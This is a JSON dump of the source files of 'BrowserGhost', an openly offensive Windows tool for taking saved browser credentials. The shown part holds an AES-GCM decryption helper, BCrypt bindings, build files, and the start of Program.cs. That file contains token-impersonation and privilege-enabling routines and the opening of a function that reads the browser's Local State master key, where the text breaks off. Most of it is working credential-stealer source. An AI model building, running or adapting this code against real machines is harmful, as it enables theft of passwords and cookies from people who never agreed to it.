{
  "metadata": {
    "timestamp": 1736711092439,
    "page": 895,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjkwMA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "QAX-A-Team/BrowserGhost",
      "stars": 1405,
      "defaultBranch": "master",
      "files": [
        {
          "name": "2.png",
          "type": "blob",
          "size": 8.0341796875,
          "content": null
        },
        {
          "name": "AesGcm.cs",
          "type": "blob",
          "size": 5.2822265625,
          "content": "﻿using System;\nusing System.Collections.Generic;\nusing System.Runtime.InteropServices;\nusing System.Security.Cryptography;\nusing System.Text;\n\nnamespace BrowserGhost\n{\n    //AES GCM from https://github.com/dvsekhvalnov/jose-jwt\n    class AesGcm\n    {\n        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)\n        {\n            IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM);\n            IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);\n\n            byte[] plainText;\n\n            var authInfo = new BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);\n            using (authInfo)\n            {\n                byte[] ivData = new byte[MaxAuthTagSize(hAlg)];\n\n                int plainTextSize = 0;\n\n                uint status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);\n\n                if (status != BCrypt.ERROR_SUCCESS)\n                    throw new CryptographicException(string.Format(\"BCrypt.BCryptDecrypt() (get size) failed with status code: {0}\", status));\n\n                plainText = new byte[plainTextSize];\n\n                status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);\n\n                if (status == BCrypt.STATUS_AUTH_TAG_MISMATCH)\n                    throw new CryptographicException(\"BCrypt.BCryptDecrypt(): authentication tag mismatch\");\n\n                if (status != BCrypt.ERROR_SUCCESS)\n                    throw new CryptographicException(string.Format(\"BCrypt.BCryptDecrypt() failed with status code:{0}\", status));\n            }\n\n            BCrypt.BCryptDestroyKey(hKey);\n            Marshal.FreeHGlobal(keyDataBuffer);\n            BCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);\n\n            return plainText;\n        }\n\n        private int MaxAuthTagSize(IntPtr hAlg)\n        {\n            byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);\n\n            return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);\n        }\n\n        private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)\n        {\n            IntPtr hAlg = IntPtr.Zero;\n\n            uint status = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);\n\n            if (status != BCrypt.ERROR_SUCCESS)\n                throw new CryptographicException(string.Format(\"BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}\", status));\n\n            byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);\n            status = BCrypt.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);\n\n            if (status != BCrypt.ERROR_SUCCESS)\n                throw new CryptographicException(string.Format(\"BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}\", status));\n\n            return hAlg;\n        }\n\n        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)\n        {\n            byte[] objLength = GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH);\n\n            int keyDataSize = BitConverter.ToInt32(objLength, 0);\n\n            IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);\n\n            byte[] keyBlob = Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);\n\n            uint status = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);\n\n            if (status != BCrypt.ERROR_SUCCESS)\n                throw new CryptographicException(string.Format(\"BCrypt.BCryptImportKey() failed with status code:{0}\", status));\n\n            return keyDataBuffer;\n        }\n\n        private byte[] GetProperty(IntPtr hAlg, string name)\n        {\n            int size = 0;\n\n            uint status = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);\n\n            if (status != BCrypt.ERROR_SUCCESS)\n                throw new CryptographicException(string.Format(\"BCrypt.BCryptGetProperty() (get size) failed with status code:{0}\", status));\n\n            byte[] value = new byte[size];\n\n            status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);\n\n            if (status != BCrypt.ERROR_SUCCESS)\n                throw new CryptographicException(string.Format(\"BCrypt.BCryptGetProperty() failed with status code:{0}\", status));\n\n            return value;\n        }\n\n        public byte[] Concat(params byte[][] arrays)\n        {\n            int len = 0;\n\n            foreach (byte[] array in arrays)\n            {\n                if (array == null)\n                    continue;\n                len += array.Length;\n            }\n\n            byte[] result = new byte[len - 1 + 1];\n            int offset = 0;\n\n            foreach (byte[] array in arrays)\n            {\n                if (array == null)\n                    continue;\n                Buffer.BlockCopy(array, 0, result, offset, array.Length);\n                offset += array.Length;\n            }\n\n            return result;\n        }\n    }\n}\n"
        },
        {
          "name": "BCrypt.cs",
          "type": "blob",
          "size": 7.63671875,
          "content": "﻿using System;\nusing System.Collections.Generic;\nusing System.Text;\nusing System.Runtime.InteropServices;\nusing BrowserGhost;\nusing System.Security.Cryptography;\n\nnamespace BrowserGhost\n{\n    public static class BCrypt\n    {\n        public const uint ERROR_SUCCESS = 0x00000000;\n        public const uint BCRYPT_PAD_PSS = 8;\n        public const uint BCRYPT_PAD_OAEP = 4;\n\n        public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);\n\n        public static readonly string BCRYPT_OBJECT_LENGTH = \"ObjectLength\";\n        public static readonly string BCRYPT_CHAIN_MODE_GCM = \"ChainingModeGCM\";\n        public static readonly string BCRYPT_AUTH_TAG_LENGTH = \"AuthTagLength\";\n        public static readonly string BCRYPT_CHAINING_MODE = \"ChainingMode\";\n        public static readonly string BCRYPT_KEY_DATA_BLOB = \"KeyDataBlob\";\n        public static readonly string BCRYPT_AES_ALGORITHM = \"AES\";\n\n        public static readonly string MS_PRIMITIVE_PROVIDER = \"Microsoft Primitive Provider\";\n\n        public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;\n        public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;\n\n        public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct BCRYPT_PSS_PADDING_INFO\n        {\n            public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)\n            {\n                this.pszAlgId = pszAlgId;\n                this.cbSalt = cbSalt;\n            }\n\n            [MarshalAs(UnmanagedType.LPWStr)]\n            public string pszAlgId;\n            public int cbSalt;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable\n        {\n            public int cbSize;\n            public int dwInfoVersion;\n            public IntPtr pbNonce;\n            public int cbNonce;\n            public IntPtr pbAuthData;\n            public int cbAuthData;\n            public IntPtr pbTag;\n            public int cbTag;\n            public IntPtr pbMacContext;\n            public int cbMacContext;\n            public int cbAAD;\n            public long cbData;\n            public int dwFlags;\n\n            public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()\n            {\n                dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;\n                cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));\n\n                if (iv != null)\n                {\n                    cbNonce = iv.Length;\n                    pbNonce = Marshal.AllocHGlobal(cbNonce);\n                    Marshal.Copy(iv, 0, pbNonce, cbNonce);\n                }\n\n                if (aad != null)\n                {\n                    cbAuthData = aad.Length;\n                    pbAuthData = Marshal.AllocHGlobal(cbAuthData);\n                    Marshal.Copy(aad, 0, pbAuthData, cbAuthData);\n                }\n\n                if (tag != null)\n                {\n                    cbTag = tag.Length;\n                    pbTag = Marshal.AllocHGlobal(cbTag);\n                    Marshal.Copy(tag, 0, pbTag, cbTag);\n\n                    cbMacContext = tag.Length;\n                    pbMacContext = Marshal.AllocHGlobal(cbMacContext);\n                }\n            }\n\n            public void Dispose()\n            {\n                if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);\n                if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);\n                if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);\n                if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);\n            }\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct BCRYPT_KEY_LENGTHS_STRUCT\n        {\n            public int dwMinLength;\n            public int dwMaxLength;\n            public int dwIncrement;\n        }\n\n        [StructLayout(LayoutKind.Sequential)]\n        public struct BCRYPT_OAEP_PADDING_INFO\n        {\n            public BCRYPT_OAEP_PADDING_INFO(string alg)\n            {\n                pszAlgId = alg;\n                pbLabel = IntPtr.Zero;\n                cbLabel = 0;\n            }\n\n            [MarshalAs(UnmanagedType.LPWStr)]\n            public string pszAlgId;\n            public IntPtr pbLabel;\n            public int cbLabel;\n        }\n\n        [DllImport(\"bcrypt.dll\")]\n        public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,\n                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,\n                                                              [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,\n                                                              uint dwFlags);\n\n        [DllImport(\"bcrypt.dll\")]\n        public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);\n\n        [DllImport(\"bcrypt.dll\", EntryPoint = \"BCryptGetProperty\")]\n        public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);\n\n        [DllImport(\"bcrypt.dll\", EntryPoint = \"BCryptSetProperty\")]\n        internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);\n\n\n        [DllImport(\"bcrypt.dll\")]\n        public static extern uint BCryptImportKey(IntPtr hAlgorithm,\n                                                         IntPtr hImportKey,\n                                                         [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,\n                                                         out IntPtr phKey,\n                                                         IntPtr pbKeyObject,\n                                                         int cbKeyObject,\n                                                         byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)\n                                                         int cbInput,\n                                                         uint dwFlags);\n\n        [DllImport(\"bcrypt.dll\")]\n        public static extern uint BCryptDestroyKey(IntPtr hKey);\n\n        [DllImport(\"bcrypt.dll\")]\n        public static extern uint BCryptEncrypt(IntPtr hKey,\n                                                byte[] pbInput,\n                                                int cbInput,\n                                                ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,\n                                                byte[] pbIV, int cbIV,\n                                                byte[] pbOutput,\n                                                int cbOutput,\n                                                ref int pcbResult,\n                                                uint dwFlags);\n\n        [DllImport(\"bcrypt.dll\")]\n        internal static extern uint BCryptDecrypt(IntPtr hKey,\n                                                  byte[] pbInput,\n                                                  int cbInput,\n                                                  ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,\n                                                  byte[] pbIV,\n                                                  int cbIV,\n                                                  byte[] pbOutput,\n                                                  int cbOutput,\n                                                  ref int pcbResult,\n                                                  int dwFlags);\n    }\n\n}"
        },
        {
          "name": "BrowserGhost.csproj",
          "type": "blob",
          "size": 4.3759765625,
          "content": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n<Project DefaultTargets=\"Build\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\" ToolsVersion=\"15.0\">\r\n  <PropertyGroup>\r\n    <Configuration Condition=\" '$(Configuration)' == '' \">Debug</Configuration>\r\n    <Platform Condition=\" '$(Platform)' == '' \">AnyCPU</Platform>\r\n    <ProductVersion>9.0.30729</ProductVersion>\r\n    <SchemaVersion>2.0</SchemaVersion>\r\n    <ProjectGuid>{F1653F20-D47D-4F29-8C55-3C835542AF5F}</ProjectGuid>\r\n    <OutputType>Exe</OutputType>\r\n    <AppDesignerFolder>Properties</AppDesignerFolder>\r\n    <RootNamespace>BrowserGhost</RootNamespace>\r\n    <AssemblyName>BrowserGhost</AssemblyName>\r\n    <FileUpgradeFlags>\r\n    </FileUpgradeFlags>\r\n    <OldToolsVersion>3.5</OldToolsVersion>\r\n    <UpgradeBackupLocation>\r\n    </UpgradeBackupLocation>\r\n    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>\r\n    <TargetFrameworkProfile>\r\n    </TargetFrameworkProfile>\r\n    <IsWebBootstrapper>false</IsWebBootstrapper>\r\n    <PublishUrl>publish\\</PublishUrl>\r\n    <Install>true</Install>\r\n    <InstallFrom>Disk</InstallFrom>\r\n    <UpdateEnabled>false</UpdateEnabled>\r\n    <UpdateMode>Foreground</UpdateMode>\r\n    <UpdateInterval>7</UpdateInterval>\r\n    <UpdateIntervalUnits>Days</UpdateIntervalUnits>\r\n    <UpdatePeriodically>false</UpdatePeriodically>\r\n    <UpdateRequired>false</UpdateRequired>\r\n    <MapFileExtensions>true</MapFileExtensions>\r\n    <ApplicationRevision>0</ApplicationRevision>\r\n    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>\r\n    <UseApplicationTrust>false</UseApplicationTrust>\r\n    <BootstrapperEnabled>true</BootstrapperEnabled>\r\n  </PropertyGroup>\r\n  <PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' \">\r\n    <DebugSymbols>true</DebugSymbols>\r\n    <DebugType>full</DebugType>\r\n    <Optimize>false</Optimize>\r\n    <OutputPath>bin\\Debug\\</OutputPath>\r\n    <DefineConstants>TRUE WIN32 _MSC_VER NDEBUG NO_TCL SQLITE_ASCII SQLITE_DISABLE_LFS SQLITE_ENABLE_OVERSIZE_CELL_CHECK SQLITE_MUTEX_OMIT SQLITE_OMIT_AUTHORIZATION SQLITE_OMIT_DEPRECATED SQLITE_OMIT_GET_TABLE SQLITE_OMIT_INCRBLOB SQLITE_OMIT_LOOKASIDE SQLITE_OMIT_SHARED_CACHE SQLITE_OMIT_UTF16 SQLITE_OMIT_VIRTUALTABLE SQLITE_OS_WIN SQLITE_SYSTEM_MALLOC VDBE_PROFILE_OFF </DefineConstants>\r\n    <ErrorReport>prompt</ErrorReport>\r\n    <WarningLevel>4</WarningLevel>\r\n    <NoWarn>0168 ; 0169; 0414; 0618; 0649</NoWarn>\r\n    <PlatformTarget>AnyCPU</PlatformTarget>\r\n  </PropertyGroup>\r\n  <PropertyGroup Condition=\" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' \">\r\n    <DebugType>pdbonly</DebugType>\r\n    <Optimize>true</Optimize>\r\n    <OutputPath>bin\\Release\\</OutputPath>\r\n    <DefineConstants>TRUE WIN32 _MSC_VER NDEBUG NO_TCL SQLITE_ASCII SQLITE_DISABLE_LFS SQLITE_ENABLE_OVERSIZE_CELL_CHECK SQLITE_MUTEX_OMIT SQLITE_OMIT_AUTHORIZATION SQLITE_OMIT_DEPRECATED SQLITE_OMIT_GET_TABLE SQLITE_OMIT_INCRBLOB SQLITE_OMIT_LOOKASIDE SQLITE_OMIT_SHARED_CACHE SQLITE_OMIT_UTF16 SQLITE_OMIT_VIRTUALTABLE SQLITE_OS_WIN SQLITE_SYSTEM_MALLOC VDBE_PROFILE_OFF </DefineConstants>\r\n    <ErrorReport>prompt</ErrorReport>\r\n    <WarningLevel>4</WarningLevel>\r\n    <PlatformTarget>x86</PlatformTarget>\r\n    <NoWarn>0168 ; 0169; 0414; 0618; 0649</NoWarn>\r\n  </PropertyGroup>\r\n  <PropertyGroup>\r\n    <StartupObject />\r\n  </PropertyGroup>\r\n  <ItemGroup>\r\n    <Reference Include=\"System\" />\r\n    <Reference Include=\"System.Data\" />\r\n    <Reference Include=\"System.Security\" />\r\n    <Reference Include=\"System.Xml\" />\r\n    <Reference Include=\"System.Management\" />\r\n  </ItemGroup>\r\n  <ItemGroup>\r\n    <Compile Include=\"AesGcm.cs\" />\r\n    <Compile Include=\"BCrypt.cs\" />\r\n    <Compile Include=\"Program.cs\" />\r\n    <Compile Include=\"SharpEdge.cs\" />\r\n    <Compile Include=\"SQLite\\**\\*.cs\" />\r\n    <Compile Include=\"Properties\\AssemblyInfo.cs\" />\r\n  </ItemGroup>\r\n  <ItemGroup>\r\n    <None Include=\"app.config\" />\r\n  </ItemGroup>\r\n  <ItemGroup>\r\n    <BootstrapperPackage Include=\"Microsoft.Net.Framework.3.5.SP1\">\r\n      <Visible>False</Visible>\r\n      <ProductName>.NET Framework 3.5 SP1</ProductName>\r\n      <Install>true</Install>\r\n    </BootstrapperPackage>\r\n  </ItemGroup>\r\n  <Import Project=\"$(MSBuildBinPath)\\Microsoft.CSharp.targets\" />\r\n  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. \r\n       Other similar extension points exist, see Microsoft.Common.targets.\r\n  <Target Name=\"BeforeBuild\">\r\n  </Target>\r\n  <Target Name=\"AfterBuild\">\r\n  </Target>\r\n  -->\r\n</Project>\r\n"
        },
        {
          "name": "BrowserGhost.sln",
          "type": "blob",
          "size": 1.1015625,
          "content": "﻿\r\nMicrosoft Visual Studio Solution File, Format Version 12.00\r\n# Visual Studio Version 16\r\nVisualStudioVersion = 16.0.29613.14\r\nMinimumVisualStudioVersion = 10.0.40219.1\r\nProject(\"{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}\") = \"BrowserGhost\", \"BrowserGhost.csproj\", \"{F1653F20-D47D-4F29-8C55-3C835542AF5F}\"\r\nEndProject\r\nGlobal\r\n\tGlobalSection(SolutionConfigurationPlatforms) = preSolution\r\n\t\tDebug|Any CPU = Debug|Any CPU\r\n\t\tRelease|Any CPU = Release|Any CPU\r\n\tEndGlobalSection\r\n\tGlobalSection(ProjectConfigurationPlatforms) = postSolution\r\n\t\t{F1653F20-D47D-4F29-8C55-3C835542AF5F}.Debug|Any CPU.ActiveCfg = Debug|Any CPU\r\n\t\t{F1653F20-D47D-4F29-8C55-3C835542AF5F}.Debug|Any CPU.Build.0 = Debug|Any CPU\r\n\t\t{F1653F20-D47D-4F29-8C55-3C835542AF5F}.Release|Any CPU.ActiveCfg = Release|Any CPU\r\n\t\t{F1653F20-D47D-4F29-8C55-3C835542AF5F}.Release|Any CPU.Build.0 = Release|Any CPU\r\n\tEndGlobalSection\r\n\tGlobalSection(SolutionProperties) = preSolution\r\n\t\tHideSolutionNode = FALSE\r\n\tEndGlobalSection\r\n\tGlobalSection(ExtensibilityGlobals) = postSolution\r\n\t\tSolutionGuid = {0F15F187-010C-49EB-9407-B24C4035BC38}\r\n\tEndGlobalSection\r\nEndGlobal\r\n"
        },
        {
          "name": "Program.cs",
          "type": "blob",
          "size": 23.0087890625,
          "content": "using System;\r\nusing System.Data;\r\nusing System.Security.Cryptography;\r\nusing System.Text;\r\nusing System.Diagnostics;\r\nusing System.IO;\r\nusing CS_SQLite3;\r\nusing System.Management;\r\nusing System.Runtime.InteropServices;\r\nusing Microsoft.Win32;\r\nusing System.Text.RegularExpressions;\r\nusing SharpEdge;\r\n\r\n\r\nnamespace BrowserGhost\r\n{\r\n    class Program\r\n    {\r\n\r\n\r\n        // Constants that are going to be used during our procedure.\r\n        private const int ANYSIZE_ARRAY = 1;\r\n        public static uint SE_PRIVILEGE_ENABLED = 0x00000002;\r\n        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;\r\n        public static uint STANDARD_RIGHTS_READ = 0x00020000;\r\n        public static uint TOKEN_ASSIGN_PRIMARY = 0x00000001;\r\n        public static uint TOKEN_DUPLICATE = 0x00000002;\r\n        public static uint TOKEN_IMPERSONATE = 0x00000004;\r\n        public static uint TOKEN_QUERY = 0x00000008;\r\n        public static uint TOKEN_QUERY_SOURCE = 0x00000010;\r\n        public static uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;\r\n        public static uint TOKEN_ADJUST_GROUPS = 0x00000040;\r\n        public static uint TOKEN_ADJUST_DEFAULT = 0x00000080;\r\n        public static uint TOKEN_ADJUST_SESSIONID = 0x00000100;\r\n        public static uint TOKEN_READ = STANDARD_RIGHTS_READ | TOKEN_QUERY;\r\n        public static uint TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;\r\n\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        public struct LUID_AND_ATTRIBUTES\r\n        {\r\n            public LUID Luid;\r\n            public UInt32 Attributes;\r\n\r\n            public const UInt32 SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;\r\n            public const UInt32 SE_PRIVILEGE_ENABLED = 0x00000002;\r\n            public const UInt32 SE_PRIVILEGE_REMOVED = 0x00000004;\r\n            public const UInt32 SE_PRIVILEGE_USED_FOR_ACCESS = 0x80000000;\r\n        }\r\n\r\n        // Luid Structure Definition\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        public struct LUID\r\n        {\r\n            public UInt32 LowPart;\r\n            public Int32 HighPart;\r\n        }\r\n\r\n        public struct TOKEN_PRIVILEGES\r\n        {\r\n            public int PrivilegeCount;\r\n            [MarshalAs(UnmanagedType.ByValArray, SizeConst = ANYSIZE_ARRAY)]\r\n            public LUID_AND_ATTRIBUTES[] Privileges;\r\n        }\r\n\r\n        [StructLayout(LayoutKind.Sequential)]\r\n        public struct PRIVILEGE_SET\r\n        {\r\n            public uint PrivilegeCount;\r\n            public uint Control;  // use PRIVILEGE_SET_ALL_NECESSARY\r\n\r\n            public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;\r\n\r\n            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]\r\n            public LUID_AND_ATTRIBUTES[] Privilege;\r\n        }\r\n\r\n        [Flags]\r\n        public enum ProcessAccessFlags : uint\r\n        {\r\n            All = 0x001F0FFF,\r\n            Terminate = 0x00000001,\r\n            CreateThread = 0x00000002,\r\n            VirtualMemoryOperation = 0x00000008,\r\n            VirtualMemoryRead = 0x00000010,\r\n            VirtualMemoryWrite = 0x00000020,\r\n            DuplicateHandle = 0x00000040,\r\n            CreateProcess = 0x000000080,\r\n            SetQuota = 0x00000100,\r\n            SetInformation = 0x00000200,\r\n            QueryInformation = 0x00000400,\r\n            QueryLimitedInformation = 0x00001000,\r\n            Synchronize = 0x00100000\r\n        }\r\n\r\n\r\n\r\n        // LookupPrivilegeValue\r\n        [DllImport(\"advapi32.dll\")]\r\n        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);\r\n\r\n        //回退到原始权限\r\n        [DllImport(\"advapi32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\r\n        public static extern bool RevertToSelf();\r\n\r\n\r\n        // OpenProcess\r\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\r\n        public static extern IntPtr OpenProcess(\r\n         ProcessAccessFlags processAccess,\r\n         bool bInheritHandle,\r\n         int processId);\r\n        public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)\r\n        {\r\n            return OpenProcess(flags, false, proc.Id);\r\n        }\r\n\r\n        // OpenProcessToken\r\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n        [return: MarshalAs(UnmanagedType.Bool)]\r\n        static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);\r\n\r\n        // DuplicateToken\r\n        [DllImport(\"advapi32.dll\")]\r\n        public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle);\r\n\r\n        // SetThreadToken\r\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n        private static extern bool SetThreadToken(IntPtr pHandle, IntPtr hToken);\r\n\r\n        // AdjustTokenPrivileges\r\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n        [return: MarshalAs(UnmanagedType.Bool)]\r\n        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle,\r\n           [MarshalAs(UnmanagedType.Bool)]bool DisableAllPrivileges,\r\n           ref TOKEN_PRIVILEGES NewState,\r\n           UInt32 BufferLengthInBytes,\r\n           ref TOKEN_PRIVILEGES PreviousState,\r\n           out UInt32 ReturnLengthInBytes);\r\n\r\n        // GetCurrentProcess\r\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\r\n        static extern IntPtr GetCurrentProcess();\r\n\r\n\r\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\r\n        public static extern bool PrivilegeCheck(\r\n            IntPtr ClientToken,\r\n            ref PRIVILEGE_SET RequiredPrivileges,\r\n            out bool pfResult\r\n            );\r\n\r\n        // Now I will create functions that use the above definitions, so we can use them directly from PowerShell :P\r\n        public static bool IsPrivilegeEnabled(string Privilege)\r\n        {\r\n            bool ret;\r\n            LUID luid = new LUID();\r\n            IntPtr hProcess = GetCurrentProcess();\r\n            IntPtr hToken;\r\n            if (hProcess == IntPtr.Zero) return false;\r\n            if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken)) return false;\r\n            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;\r\n            PRIVILEGE_SET privs = new PRIVILEGE_SET { Privilege = new LUID_AND_ATTRIBUTES[1], Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY, PrivilegeCount = 1 };\r\n            privs.Privilege[0].Luid = luid;\r\n            privs.Privilege[0].Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED;\r\n            if (!PrivilegeCheck(hToken, ref privs, out ret)) return false;\r\n            return ret;\r\n        }\r\n\r\n        public static bool EnablePrivilege(string Privilege)\r\n        {\r\n            LUID luid = new LUID();\r\n            IntPtr hProcess = GetCurrentProcess();\r\n            IntPtr hToken;\r\n            if (!OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out hToken)) return false;\r\n            if (!LookupPrivilegeValue(null, Privilege, out luid)) return false;\r\n            // First, a LUID_AND_ATTRIBUTES structure that points to Enable a privilege.\r\n            LUID_AND_ATTRIBUTES luAttr = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = LUID_AND_ATTRIBUTES.SE_PRIVILEGE_ENABLED };\r\n            // Now we create a TOKEN_PRIVILEGES structure with our modifications\r\n            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Privileges = new LUID_AND_ATTRIBUTES[1] };\r\n            tp.Privileges[0] = luAttr;\r\n            TOKEN_PRIVILEGES oldState = new TOKEN_PRIVILEGES(); // Our old state.\r\n            if (!AdjustTokenPrivileges(hToken, false, ref tp, (UInt32)Marshal.SizeOf(tp), ref oldState, out UInt32 returnLength)) return false;\r\n            return true;\r\n        }\r\n\r\n        public static bool ImpersonateProcessToken(int pid)\r\n        {\r\n            IntPtr hProcess = OpenProcess(ProcessAccessFlags.QueryInformation, true, pid);\r\n            if (hProcess == IntPtr.Zero) return false;\r\n            IntPtr hToken;\r\n            if (!OpenProcessToken(hProcess, TOKEN_IMPERSONATE | TOKEN_DUPLICATE, out hToken)) return false;\r\n            IntPtr DuplicatedToken = new IntPtr();\r\n            if (!DuplicateToken(hToken, 2, ref DuplicatedToken)) return false;\r\n            if (!SetThreadToken(IntPtr.Zero, DuplicatedToken)) return false;\r\n            return true;\r\n        }\r\n        private static string GetProcessUserName(int pID)\r\n        {\r\n\r\n\r\n            string text1 = null;\r\n\r\n\r\n            SelectQuery query1 =\r\n              new SelectQuery(\"Select * from Win32_Process WHERE processID=\" + pID);\r\n            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1);\r\n\r\n\r\n            try\r\n            {\r\n                foreach (ManagementObject disk in searcher1.Get())\r\n                {\r\n                    ManagementBaseObject inPar = null;\r\n                    ManagementBaseObject outPar = null;\r\n\r\n\r\n                    inPar = disk.GetMethodParameters(\"GetOwner\");\r\n\r\n\r\n                    outPar = disk.InvokeMethod(\"GetOwner\", inPar, null);\r\n\r\n\r\n                    text1 = outPar[\"User\"].ToString();\r\n                    break;\r\n                }\r\n            }\r\n            catch\r\n            {\r\n                text1 = \"SYSTEM\";\r\n            }\r\n\r\n\r\n            return text1;\r\n        }\r\n\r\n        public static byte[] GetMasterKey(string filePath)\r\n        {\r\n            //Key saved in Local State file\r\n\r\n            byte[] masterKey = new byte[] { };\r\n\r\n            if (File.Exists(filePath) == false)\r\n                return null;\r\n\r\n            //Get key with regex.\r\n            var pattern = new 